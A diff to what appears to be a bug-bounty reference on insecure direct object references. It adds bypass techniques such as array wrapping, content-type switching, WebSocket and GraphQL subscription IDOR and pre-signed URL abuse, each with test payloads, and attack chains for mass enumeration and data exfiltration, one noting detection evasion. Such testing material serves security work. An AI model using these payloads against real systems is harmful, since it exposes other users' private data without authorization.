@@ -632,11 +632,262 @@ POST /api/transfer
 user_id=1001&amount=100&user_id=1002
 ```
 
+### Wildcard Parameter Injection
+
+## Wildcard Parameter Injection
+**Reference type:** Wildcard character  
+**API pattern:** REST  
+**Authorization flaw:** Backend processes `*`, `%`, `_`, or `.` as universal matchers and returns all records instead of rejecting the request; no ownership check is reached because the wildcard matches everything before auth logic fires.  
+**Escalation:** Horizontal (mass enumeration)  
+**Business impact:** Full user database or file listing exposed in a single request  
+**Test payload:**
+```http
+GET /api/users/* HTTP/1.1
+GET /api/users/%
+GET /api/users/_
+GET /api/files/.
+GET /api/orders/*/details
+Authorization: Bearer <any-valid-token>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## Content-Type Switching IDOR Bypass
+**Reference type:** Any (numeric/GUID/hash)  
+**API pattern:** REST  
+**Authorization flaw:** Access control middleware is applied only to one content type (typically `application/json`). Switching to `application/xml`, `text/plain`, or `application/x-www-form-urlencoded` routes the request through a different handler or parser that skips the ACL check.  
+**Escalation:** Horizontal / Vertical  
+**Business impact:** Unauthorized read or write access to any object by evading content-type-specific authorization  
+**Test payload:**
+```http
+# Original (blocked):
+POST /api/users/1002/data HTTP/1.1
+Content-Type: application/json
+{"action": "read"}
+
+# Bypass attempt 1 — switch to XML:
+POST /api/users/1002/data HTTP/1.1
+Content-Type: application/xml
+<action>read</action>
+
+# Bypass attempt 2 — switch to form-encoded:
+POST /api/users/1002/data HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+action=read
+
+# Bypass attempt 3 — text/plain (some frameworks skip validation):
+POST /api/users/1002/data HTTP/1.1
+Content-Type: text/plain
+{"action": "read"}
+```
+**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
+
+---
+
+## Array Wrapping (Type Coercion IDOR)
+**Reference type:** Numeric ID  
+**API pattern:** REST (JSON body)  
+**Authorization flaw:** Server-side authorization validates that a scalar `id` field belongs to the session user, but when the same value arrives as a single-element array the type check is bypassed — the framework either coerces it to a scalar silently or the ACL comparison evaluates to true before unpacking.  
+**Escalation:** Horizontal  
+**Business impact:** Access to any resource by sending `{"id":[victim_id]}` instead of `{"id": victim_id}`  
+**Test payload:**
+```http
+# Original (blocked):
+POST /api/documents/view HTTP/1.1
+Content-Type: application/json
+{"id": 1002}
+
+# Bypass — wrap in array:
+{"id": [1002]}
+
+# Also try:
+{"id": [1002, 1003, 1004]}   ← may return batch of other users' objects
+{"user_id": [42]}
+{"invoice_id": [88821]}
+
+# JSON number → string coercion variant:
+{"id": "1002"}   ← integer check skipped if server accepts strings
+{"id": "1002.0"} ← floating point coercion
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## File Extension Appending
+**Reference type:** Path-based (filename / numeric)  
+**API pattern:** REST  
+**Authorization flaw:** Access control is applied to the base route (`/user_data/2341`) but the framework routes requests with appended extensions (`.json`, `.xml`, `.csv`) to a different controller or serializer that has no ACL middleware. Common in Rails, Laravel, and Express with route globbing.  
+**Escalation:** Horizontal  
+**Business impact:** Unauthorized access to another user's data by requesting an alternate serialized representation of the same object  
+**Test payload:**
+```http
+# Original (blocked):
+GET /api/user_data/2341 HTTP/1.1
+→ 403 Forbidden
+
+# Extension bypass:
+GET /api/user_data/2341.json HTTP/1.1
+GET /api/user_data/2341.xml HTTP/1.1
+GET /api/user_data/2341.csv HTTP/1.1
+GET /api/user_data/2341.html HTTP/1.1
+
+# Also try on file download endpoints:
+GET /invoices/88821.pdf HTTP/1.1   ← if /invoices/88821 returned 403
+```
+**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
+
+---
+
+## Parameter Name Substitution
+**Reference type:** Numeric ID  
+**API pattern:** REST  
+**Authorization flaw:** The backend accepts multiple parameter names for the same underlying object (e.g., `album_id` and `collection_id` both map to the photo album table). The authorization check validates only the canonical parameter name; substituting an alias bypasses the check while still accessing the same object.  
+**Escalation:** Horizontal / Vertical  
+**Business impact:** Unauthorized access to objects via undocumented or aliased parameter names that lack authorization enforcement  
+**Test payload:**
+```http
+# Discover the canonical param from normal app flow, then substitute:
+# Canonical (blocked):
+GET /api/photos?album_id=9982
+→ 403 Forbidden
+
+# Substitute aliases:
+GET /api/photos?collection_id=9982
+GET /api/photos?folder_id=9982
+GET /api/photos?gallery_id=9982
+GET /api/photos?id=9982
+
+# In request body — try alternate names:
+POST /api/messages/get
+{"thread_id": 5001}      ← blocked
+{"conversation_id": 5001} ← alias, may lack ACL
+
+# Also: swap object-type prefix
+GET /api/data?user_id=1002  → try GET /api/data?account_id=1002
+```
+**Source:** https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
+
+---
+
+## WebSocket IDOR
+**Reference type:** Numeric / GUID  
+**API pattern:** WebSocket  
+**Authorization flaw:** WebSocket connections authenticate at the handshake (HTTP Upgrade request) but perform no per-message object-level authorization. Once connected, resource IDs sent in message payloads are processed without verifying the connected user owns the referenced object.  
+**Escalation:** Horizontal / Vertical  
+**Business impact:** Real-time access to private data streams, chat messages, notifications, or live dashboards belonging to other users  
+**Test payload:**
+```
+# Step 1: Establish WebSocket connection (auth happens here via cookie/token)
+GET /ws HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+Cookie: session=<your-session>
+
+# Step 2: After connection, send message with another user's object ID
+# Burp Suite: Proxy → WebSocket history → intercept and modify
+
+# Subscribe to another user's notification stream:
+{"action": "subscribe", "channel": "user_notifications", "user_id": 1002}
+
+# Request another user's chat room:
+{"type": "join_room", "room_id": "private_room_9982"}
+
+# Fetch another user's live dashboard data:
+{"event": "get_dashboard", "account_id": "ACC-1002"}
+
+# Read another user's messages in real-time:
+{"cmd": "fetch_messages", "conversation_id": 5001, "user_id": 1002}
+
+# Tool: Burp Suite WebSocket tab, wscat for manual testing
+# wscat -c wss://target.com/ws --header "Cookie: session=<yours>"
+```
+**Source:** https://portswigger.net/web-security/websockets
+
+---
+
+## GraphQL Subscription IDOR
+**Reference type:** Numeric / GUID  
+**API pattern:** GraphQL (Subscription over WebSocket)  
+**Authorization flaw:** GraphQL subscription resolvers are implemented separately from query/mutation resolvers. Teams add ownership checks to queries and mutations but forget subscription resolvers — any authenticated user can subscribe to another user's event stream by supplying their `userId` or `objectId` argument.  
+**Escalation:** Horizontal  
+**Business impact:** Real-time exfiltration of another user's private events, order status, messages, or financial transactions  
+**Test payload:**
+```graphql
+# Subscribe to another user's order updates:
+subscription {
+  orderUpdated(userId: "1002") {
+    orderId
+    status
+    total
+    shippingAddress { street city zip }
+  }
+}
+
+# Subscribe to another user's notifications:
+subscription {
+  newNotification(userId: "1002") {
+    message
+    type
+    timestamp
+  }
+}
+
+# Subscribe to another user's chat messages:
+subscription {
+  messageReceived(conversationId: "conv_9982") {
+    content
+    sender { id email }
+    sentAt
+  }
+}
+
+# Discover subscriptions via introspection:
+query {
+  __schema {
+    subscriptionType {
+      fields { name args { name type { name } } }
+    }
+  }
+}
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## Pre-Signed Object Storage IDOR
+**Reference type:** Filename / object key  
+**API pattern:** REST (AWS S3, GCS, Azure Blob Storage)  
+**Authorization flaw:** The API endpoint that *generates* a pre-signed URL checks only that the requester is authenticated, not that they own the requested object key. Any authenticated user can request a time-limited signed URL for any object key in the bucket, including files belonging to other users.  
+**Escalation:** Horizontal  
+**Business impact:** Access to private files, documents, medical records, financial exports, or user attachments stored in cloud object storage  
+**Test payload:**
+```http
+# Step 1: Request a pre-signed URL for your own file (observe the object key pattern):
+POST /api/files/presign HTTP/1.1
+{"key": "uploads/user_1001/invoice_jan2026.pdf"}
+→ {"url": "https://bucket.s3.amazonaws.com/uploads/user_1001/invoice_jan2026.pdf?X-Amz-Signature=..."}
+
+# Step 2: Request a signed URL for another user's object key:
+POST /api/files/presign HTTP/1.1
+{"key": "uploads/user_1002/invoice_jan2026.pdf"}
+→ If server returns a signed URL → IDOR confirmed
+
+# Step 3: Fetch the file directly using the signed URL (no further auth needed)
+GET https://bucket.s3.amazonaws.com/uploads/user_1002/invoice_jan2026.pdf?X-Amz-Signature=...
+
+# Variations:
+POST /api/download {"filename": "user_1002/export_2026.csv"}
+GET /api/attachments/presign?key=tickets/ticket_9982/attachment.docx
+POST /api/avatar/upload-url {"userId": 1002}   ← write IDOR via presign
+```
+**Source:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
+
 ---
 
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Update each session.
+> Current patterns as of 2026-05-24. Update each session.
 
 **What's being exploited in the wild:**
 
@@ -646,7 +897,9 @@ user_id=1001&amount=100&user_id=1002
 
 2. **GraphQL IDOR at scale** — As more APIs migrate to GraphQL, IDOR in mutations is
    extremely common. Developers implement query-level auth but forget mutation-level.
-   Batch queries allow mass enumeration in a single request.
+   Batch queries allow mass enumeration in a single request. GraphQL subscriptions are
+   the newest blind spot — subscription resolvers routinely lack the ownership checks
+   present in query/mutation resolvers.
 
 3. **Bulk operations skip per-object auth** — `DELETE /api/items` with a body of IDs
    almost never validates each ID against the session. Affects archiving, exporting,
@@ -660,6 +913,22 @@ user_id=1001&amount=100&user_id=1002
 5. **Mobile API lag** — Mobile apps often communicate with `/api/mobile/` or `/api/v1/`
    endpoints that have fewer auth checks than the web app's API. Always intercept mobile
    app traffic (use Frida or HTTP proxy on device) separately from web.
+
+6. **WebSocket message-level IDOR** — WebSocket auth happens at handshake; per-message
+   object-level checks are almost universally missing. Real-time apps (chat, trading,
+   dashboards) built on WebSockets are systematically vulnerable. A valid session cookie
+   is all you need to subscribe to any user's private data stream.
+
+7. **Pre-signed object storage IDOR** — Cloud-native apps offload file delivery to S3/GCS
+   signed URLs. The endpoint that generates the signed URL frequently checks authentication
+   but not ownership of the object key. Any file key is accessible to any authenticated
+   user. Common in document-sharing, invoicing, and healthcare SaaS platforms.
+
+8. **Type coercion bypasses (array wrapping, content-type switching)** — Authorization
+   middleware that validates a scalar `id` field will often pass when the same ID is
+   wrapped in a JSON array (`[id]`) or when the content type is switched from JSON to
+   XML/form-encoded. These simple one-character changes evade a surprising number of
+   access control implementations.
 
 ---
 
@@ -677,6 +946,13 @@ user_id=1001&amount=100&user_id=1002
 | Per-object check on v2 | Same endpoint on v1/v0/internal/mobile |
 | Sequential IDs monitored | Use existing leaked IDs from emails, JS, error messages |
 | Response is 404 not 403 | Still attempt write methods (PUT/DELETE) — 404 may be fake |
+| Scalar ID validation | Wrap ID in array: `{"id": [1002]}` — coercion bypasses ACL |
+| JSON content-type check | Switch to XML, text/plain, or form-encoded body |
+| Path-based ACL | Append file extension: `/resource/1002.json` instead of `/resource/1002` |
+| Canonical param name ACL | Substitute alias: `album_id` → `collection_id`, `folder_id`, `id` |
+| WebSocket session auth | Send victim's object ID in message body after your own handshake |
+| GraphQL query/mutation ACL | Subscribe to victim's events via subscription resolver (often unprotected) |
+| Presigned URL ownership | Request `/api/files/presign` with victim's object key |
 
 ---
 
@@ -696,6 +972,11 @@ user_id=1001&amount=100&user_id=1002
 | `/api/payment-methods/{id}` | Horizontal | Financial data, charge trigger |
 | Batch delete `{"ids": [...]}` | Bulk | Cross-user deletion |
 | `/api/team/invite/{token}` | Horizontal | Accept invite meant for others |
+| `/api/files/presign` or `/api/download` | Pre-signed URL | Private file access (S3/GCS/Azure) |
+| WebSocket `/ws` + message `user_id` | WebSocket | Real-time private data stream |
+| GraphQL subscription `newNotification(userId:)` | GraphQL subscription | Live event stream exfiltration |
+| `/api/users/*` wildcard | Wildcard injection | Mass user data exposure |
+| Recently released feature endpoints | New feature | Immature access controls, highest ratio |
 
 ---
 
@@ -785,4 +1066,58 @@ Impact: Critical — cross-tenant data breach in SaaS
 6. Full account takeover even with 2FA enabled
 
 Impact: Critical — complete bypass of 2FA protection
+```
+
+### Chain 6: WebSocket IDOR → Real-Time Private Data Exfiltration
+
+```
+1. Open Burp Suite, enable WebSocket interception
+   Navigate to the real-time feature (live chat, dashboard, trading view)
+
+2. Observe the WebSocket handshake:
+   GET /ws HTTP/1.1
+   Cookie: session=<your-session>
+   → Connection established
+
+3. Observe initial subscription message sent by client:
+   {"action": "subscribe", "channel": "user_feed", "user_id": "1001"}
+   → Server responds with your real-time events
+
+4. Intercept next message, modify user_id to another account:
+   {"action": "subscribe", "channel": "user_feed", "user_id": "1002"}
+   → Server sends user 1002's live feed (no per-message ownership check)
+
+5. Exfiltrate in real-time: order placements, messages, notifications,
+   financial transactions, location updates
+
+6. Chain with account enumeration: iterate user_id from 1 to N in a loop
+   wscat -c wss://target.com/ws --header "Cookie: session=<yours>"
+   > {"action":"subscribe","channel":"user_feed","user_id":1002}
+   > {"action":"subscribe","channel":"user_feed","user_id":1003}
+
+Impact: Critical — real-time mass data exfiltration with a single valid session
+Note: WebSocket IDOR is often missed because Burp's scanner doesn't cover WS messages
+```
+
+### Chain 7: Pre-Signed URL IDOR → Private File Download → PII Mass Exfil
+
+```
+1. Trigger a file download in the app for your own account:
+   POST /api/files/presign {"key": "invoices/user_1001/Q1_2026.pdf"}
+   → {"signed_url": "https://bucket.s3.amazonaws.com/invoices/user_1001/Q1_2026.pdf?X-Amz-Signature=abc..."}
+
+2. Note the object key pattern: invoices/user_{id}/Q{quarter}_{year}.pdf
+
+3. Request a signed URL for another user's object key:
+   POST /api/files/presign {"key": "invoices/user_1002/Q1_2026.pdf"}
+   → If server returns a valid signed URL: IDOR confirmed
+
+4. Enumerate: generate signed URLs for user_1001 through user_5000
+   All quarterly invoices accessible with no additional auth
+
+5. Download each file directly using the time-limited signed URL
+   (AWS signs the URL server-side — the download itself is unauthenticated)
+
+Impact: Critical — financial document mass exfiltration
+Detection evasion: downloads appear to come from legitimate AWS/GCS infrastructure
 ```
